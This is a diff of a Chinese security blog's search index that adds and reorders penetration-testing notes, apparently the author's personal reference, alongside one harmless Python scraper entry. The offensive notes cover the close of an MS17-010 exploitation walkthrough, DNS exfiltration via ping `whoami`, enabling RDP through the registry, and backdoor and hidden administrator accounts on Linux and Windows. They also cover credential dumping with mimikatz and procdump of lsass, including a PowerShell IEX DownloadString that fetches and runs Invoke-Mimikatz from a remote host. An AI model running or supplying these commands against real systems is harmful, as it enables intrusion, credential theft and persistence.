+<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
+<p>提权成功</p>
+<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
+<p>b、成功连接至靶机</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
+<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>MS17-010</tag>
       </tags>
   </entry>
   <entry>
@@ -4378,7 +4378,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#x31;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x31;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a>](mailto:<a href="mailto:&#49;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#109;">&#49;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#109;</a>)’ WHERE uname=’admin’; “);</td>
+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#x31;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x31;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a>](mailto:<a href="mailto:&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -4927,6 +4927,29 @@
       </tags>
   </entry>
   <entry>
+    <title>Python之网络爬虫</title>
+    <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
+
+<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br></pre>
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
+
+<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Redis未授权访问漏洞复现</title>
     <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
@@ -5037,29 +5060,6 @@
       </categories>
       <tags>
         <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python之网络爬虫</title>
-    <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
-
-<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br></pre>
-
-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
-
-<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -5347,6 +5347,31 @@
       </tags>
   </entry>
   <entry>
+    <title>Web渗透随记</title>
+    <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
+<p><a href="http://dnslog.cn/">http://dnslog.cn/</a> #需要生成随机DNS</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
+
+<p>（注：``为优先运行符，可以用$()代替）</p>
+<p>适用：</p>
+<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
+<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
+<p>开启：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
+
+<p>关闭：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>随记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ueditor漏洞复现</title>
     <url>/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。</p>
@@ -5391,31 +5416,6 @@
       </categories>
       <tags>
         <tag>Ueditor</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web渗透随记</title>
-    <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
-<p><a href="http://dnslog.cn/">http://dnslog.cn/</a> #需要生成随机DNS</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
-
-<p>（注：``为优先运行符，可以用$()代替）</p>
-<p>适用：</p>
-<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
-<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
-<p>开启：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
-
-<p>关闭：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -5950,7 +5950,7 @@
 </tr>
 </tbody></table>
 <p>文件查找</p>
-<pre class="highlight"><span class="line">for /r c:/ %i in (*.png) do @echo %i		#搜索C盘下包含png后缀的文件</span><br><span class="line">for /r c:/ %i in (*user*) do @echo %i		#搜索C盘下包含user关键词的文件</span><br></pre>
+<pre class="highlight"><span class="line">dir C:\2019* /s /b 		# 查找2019开头文件</span><br></pre>
 
 
 
@@ -7067,6 +7067,54 @@
       </tags>
   </entry>
   <entry>
+    <title>创建用户+提权</title>
+    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
+<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
+
+<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
+<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
+
+<p>b、然后修改用户，使其属于root组</p>
+<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
+
+<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
+<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
+
+<p>b、使用test账号登录，即可使用sudo权限操作</p>
+<p>如：sudo ls</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
+<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
+
+<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
+<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
+
+<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
+
+
+
+<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user test$ 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
+
+<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
+
+<p>查看管理员组成员</p>
+<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
+
+<p>删除用户</p>
+<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
+
+<p>禁用用户/启用用户</p>
+<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>入侵排查</title>
     <url>/article/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
     <content><![CDATA[<h1 id="一、Windows入侵排查"><a href="#一、Windows入侵排查" class="headerlink" title="一、Windows入侵排查"></a>一、Windows入侵排查</h1><p>排查顺序（写排查报告的顺序相同）</p>
@@ -7239,54 +7287,6 @@
       </categories>
       <tags>
         <tag>入侵排查</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>创建用户+提权</title>
-    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
-<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
-
-<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
-<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
-
-<p>b、然后修改用户，使其属于root组</p>
-<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
-
-<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
-<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
-<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
-
-<p>b、使用test账号登录，即可使用sudo权限操作</p>
-<p>如：sudo ls</p>
-<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
-<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
-
-<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
-<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
-
-<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
-
-
-
-<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user test$ 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
-
-<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
-
-<p>查看管理员组成员</p>
-<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
-
-<p>删除用户</p>
-<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
-
-<p>禁用用户/启用用户</p>
-<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -7700,6 +7700,96 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>密码抓取与hash传递小结</title>
+    <url>/article/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E4%B8%8Ehash%E4%BC%A0%E9%80%92%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<p><strong>密码认证机制</strong></p>
+<p>windows</p>
+<p>winlogon.exe为登录界面</p>
+<p>密码 -&gt; 系统加密（不可逆） -&gt; 二进制存储(需要按照固定格式读取) -&gt; sam</p>
+<p>账号密码验证 -&gt; lsass.exe -&gt; 验证（保存在内存中，不需要多次手动验证）适用于2008-/win7-</p>
+<p><strong>密码格式</strong></p>
+<p>2003-/xp- lmhash,密码不能超过14位等bug</p>
+<p>2003+/xp+ ntlm hash,密码-&gt;hex-&gt;unicode-&gt;md4-&gt;32位密码（8bit）</p>
+<h1 id="明文密码："><a href="#明文密码：" class="headerlink" title="明文密码："></a>明文密码：</h1><p>1、hash爆破比对</p>
+<p>2、从lsass进程中读取明文密码</p>
+<p>A、 </p>
+<p>工具：mimikatz.exe mimilib.dll mimidrv.sys</p>
+<p>命令：<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
+<p>B、 mimikatz.ps1脚本</p>
+<p><code>powershell.exe Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz</code></p>
+<p>3种运行方式</p>
+<p>远程执行</p>
+<p><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.21.112:9000/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;</code></p>
+<p>C、 </p>
+<p><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
+<p>procdump是内存分析工具，可以把进程对应内存空间中的数据，转存为文件</p>
+<p>然后使用mimikatz读取</p>
+<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</code></p>
+<p>免杀</p>
+<p>D、 cs中mimikatz（shellcode机器语言）</p>
+<p>使用机器语言命令，在内存空间中运行</p>
+<p>E、 msf中kiwi</p>
+<p>3、winserver2012+/win8+，禁止将明文密码保存至lsass中</p>
+<p>修改注册表，重新开启功能，(需要管理员重新登陆）</p>
+<p>蓝屏攻击、修改关键数据库（延时攻击等）等，使得服务器异常，强制管理员登录</p>
+<p>重新登录后，使用2中功能重新抓取密码</p>
